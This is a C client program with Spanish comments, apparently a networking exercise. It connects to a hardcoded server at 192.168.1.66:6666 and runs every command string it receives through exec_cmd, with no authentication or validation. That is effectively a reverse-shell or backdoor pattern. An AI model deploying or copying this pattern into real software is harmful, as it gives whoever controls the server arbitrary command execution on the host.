#include "../include/cliente.h"


int main (int argc, char *argv[]){
  
  struct sigaction sa_sigint;
  struct sigaction sa_sigchld;
  
  sa_sigint.sa_handler = sig_handler;
  sa_sigint.sa_flags = SA_RESTART;
  if(sigaction(SIGINT, &sa_sigint, NULL) == -1)
  {
    printf("No se pudo registrar el manejador para Ctrl-C\n");
  }
  sa_sigchld.sa_handler = SIG_IGN;
  sa_sigchld.sa_flags = SA_NOCLDSTOP || SA_NOCLDWAIT;
  if(sigaction(SIGCHLD, &sa_sigchld, NULL) == -1)
  {
    printf("No se pudo registrar el manejador para SIGCHLD\n");
  }
  
  puerto = 6666;
  ip = "192.168.1.66";
  struct sockaddr_in addin;
  printf("Conectando al servidor...\n");
  sckdes=crear_socket_cliente(puerto, ip, (struct sockaddr *)&addin);
  if(conectar(sckdes, (struct sockaddr *)&addin) != -1)
  {
    printf(">>> Conexion establecida con el servidor\n");
    char comando[MAX_LINE];
    while(leer_socket(sckdes,comando,MAX_LINE) > 0)
    {
      if(*comando == '\0') continue;
      printf(">> %s\n",comando);
      exec_cmd(comando);
    }
  }else
  {
   printf("[*] No se ha podido conectar con el servidor\n"); 
  }
  cerrar_cliente();
}

/*
#########################################
#					#
#		Métodos			#
#					#
#########################################
*/

int crear_socket_cliente(int puerto, char* host, struct sockaddr *sock_client)
{
  int sck = socket(AF_INET, SOCK_STREAM, 0);
  ((struct sockaddr_in*)sock_client)->sin_family = AF_INET;
  ((struct sockaddr_in*)sock_client)->sin_port = htons(puerto);
  ((struct sockaddr_in*)sock_client)->sin_addr.s_addr = inet_addr(host);
  bzero(&(((struct sockaddr_in*)sock_client)->sin_zero),8);
  return sck;
}

/**Conectar al host especificado por addin por medio del socket
 sck, retorna 0 si la conexion es exitosa, -1 de lo contrario*/
int conectar(int sck,struct sockaddr *addin)
{
    int conexion=connect(sck, addin, sizeof(struct sockaddr));
    return conexion;
}

void cerrar_cliente()
{
  printf(" Se cierra la conexión\n");
  close(sckdes);
  exit(0);
}

void sig_handler(int signal)
{
  switch(signal)
  {
    case SIGINT:
      //Se precionó Ctrl-C
      cerrar_cliente();
      break;
    default: break;
  }
  return;
}